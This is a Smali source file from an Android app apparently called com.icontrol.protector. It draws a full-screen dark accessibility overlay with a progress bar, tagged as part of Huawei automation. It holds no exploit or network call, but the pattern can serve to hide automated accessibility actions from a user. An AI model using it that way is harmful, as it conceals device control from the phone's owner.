.class Lcom/icontrol/protector/AccessServices$HuaweiBlockViewRunnable;
.super Ljava/lang/Object;
.source "AccessServices.java"

.implements Ljava/lang/Runnable;

.annotation system Ldalvik/annotation/EnclosingClass;
    value = Lcom/icontrol/protector/AccessServices;
.end annotation

.annotation system Ldalvik/annotation/InnerClass;
    accessFlags = 0x8
    name = "HuaweiBlockViewRunnable"
.end annotation

.field final synthetic this$0:Lcom/icontrol/protector/AccessServices;

.method constructor <init>(Lcom/icontrol/protector/AccessServices;)V
    .locals 0

    iput-object p1, p0, Lcom/icontrol/protector/AccessServices$HuaweiBlockViewRunnable;->this$0:Lcom/icontrol/protector/AccessServices;

    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    return-void
.end method

.method public run()V
    .locals 12

    :try_start_0
    # 1. Get AccessServices instance
    iget-object v0, p0, Lcom/icontrol/protector/AccessServices$HuaweiBlockViewRunnable;->this$0:Lcom/icontrol/protector/AccessServices;
    if-eqz v0, :cond_end

    # 2. Check if block view already exists
    sget-object v1, Lcom/icontrol/protector/AccessServices;->hwBlockView:Landroid/view/View;
    if-nez v1, :cond_end

    # 3. Get WindowManager
    const-string v1, "window"
    invoke-virtual {v0, v1}, Landroid/content/Context;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;
    move-result-object v1
    check-cast v1, Landroid/view/WindowManager;
    if-eqz v1, :cond_end

    # 4. Create root LinearLayout (vertical)
    new-instance v2, Landroid/widget/LinearLayout;
    invoke-direct {v2, v0}, Landroid/widget/LinearLayout;-><init>(Landroid/content/Context;)V

    # setOrientation(VERTICAL = 1)
    const/4 v3, 0x1
    invoke-virtual {v2, v3}, Landroid/widget/LinearLayout;->setOrientation(I)V

    # setBackgroundColor(0xFF303133) - dark gray matching GuideActivity
    const v3, 0x303133
    const/high16 v4, -0x1000000    # 0xFF000000
    or-int/2addr v3, v4             # 0xFF303133
    invoke-virtual {v2, v3}, Landroid/view/View;->setBackgroundColor(I)V

    # setGravity(CENTER_HORIZONTAL | CENTER_VERTICAL = 0x11)
    const/16 v3, 0x11
    invoke-virtual {v2, v3}, Landroid/widget/LinearLayout;->setGravity(I)V

    # 5. Create ProgressBar (horizontal, indeterminate)
    # Use constructor ProgressBar(context, null, android.R.attr.progressBarStyleHorizontal)
    const v3, 0x101007e    # android.R.attr.progressBarStyleHorizontal
    const/4 v4, 0x0
    new-instance v5, Landroid/widget/ProgressBar;
    invoke-direct {v5, v0, v4, v3}, Landroid/widget/ProgressBar;-><init>(Landroid/content/Context;Landroid/util/AttributeSet;I)V

    # setIndeterminate(true)
    const/4 v3, 0x1
    invoke-virtual {v5, v3}, Landroid/widget/ProgressBar;->setIndeterminate(Z)V

    # Create LayoutParams for ProgressBar (MATCH_PARENT, 8dp)
    # Convert 8dp to pixels: approximate 8 * density, use 12px as safe value
    new-instance v6, Landroid/widget/LinearLayout$LayoutParams;
    const/4 v7, -0x1              # MATCH_PARENT
    const/16 v8, 0xc              # 12px height
    invoke-direct {v6, v7, v8}, Landroid/widget/LinearLayout$LayoutParams;-><init>(II)V

    # Set top margin to push progress bar to top area
    # We'll use gravity instead - set layout gravity to TOP
    # Set margins: left=0, top=200, right=0, bottom=0 (push down a bit from top)
    const/4 v7, 0x0
    const/16 v8, 0xc8             # 200px from top
    invoke-virtual {v6, v7, v8, v7, v7}, Landroid/view/ViewGroup$MarginLayoutParams;->setMargins(IIII)V

    # Add ProgressBar to LinearLayout
    invoke-virtual {v2, v5, v6}, Landroid/widget/LinearLayout;->addView(Landroid/view/View;Landroid/view/ViewGroup$LayoutParams;)V

    # 6. Create WindowManager.LayoutParams
    new-instance v6, Landroid/view/WindowManager$LayoutParams;

    const/4 v7, -0x1              # width = MATCH_PARENT
    const/4 v8, -0x1              # height = MATCH_PARENT
    const/16 v9, 0x7f0            # type = TYPE_ACCESSIBILITY_OVERLAY (2032)
    const/16 v10, 0x118           # flags = NOT_FOCUSABLE(0x8) | NOT_TOUCHABLE(0x10) | LAYOUT_IN_SCREEN(0x100)
    const/4 v11, -0x3             # format = TRANSLUCENT

    invoke-direct/range {v6 .. v11}, Landroid/view/WindowManager$LayoutParams;-><init>(IIIII)V

    # 7. Add view to WindowManager
    invoke-interface {v1, v2, v6}, Landroid/view/ViewManager;->addView(Landroid/view/View;Landroid/view/ViewGroup$LayoutParams;)V

    # 8. Save references (save the root LinearLayout as hwBlockView)
    sput-object v2, Lcom/icontrol/protector/AccessServices;->hwBlockView:Landroid/view/View;
    sput-object v1, Lcom/icontrol/protector/AccessServices;->hwBlockWm:Landroid/view/WindowManager;

    # 9. Log
    const-string v4, "HW_AUTO"
    const-string v5, "BlockView created (GuideActivity style)"
    invoke-static {v4, v5}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    goto :cond_end

    :catch_0
    move-exception v0
    const-string v1, "HW_AUTO"
    const-string v2, "BlockView create failed"
    invoke-static {v1, v2}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;)I

    :cond_end
    return-void
.end method
